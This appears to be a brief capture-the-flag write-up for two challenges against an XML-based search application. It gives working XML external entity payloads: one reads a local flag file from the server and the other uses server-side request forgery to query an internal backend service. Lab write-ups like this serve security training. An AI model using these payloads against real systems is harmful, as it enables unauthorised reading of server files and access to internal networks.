### Challenge 1

The XML-based web search application can be manipulated by providing a malicious XML payload that reads the flag directly from the underlying file system:

Payload:
```xml
<!DOCTYPE search [   
<!ELEMENT search ANY > 
<!ENTITY xxe SYSTEM "file:///flag.txt" >]><search>&xxe;</search> 
```


### Challenge 2

The XML-based web search application can be manipulated by providing a malicious XML payload that reads the flag from the remote backend web service via SSRF:

Payload:
```xml
<!DOCTYPE search [   
<!ELEMENT search ANY > 
<!ENTITY xxe SYSTEM "http://backend.example.com" >]><search>&xxe;</search>
```
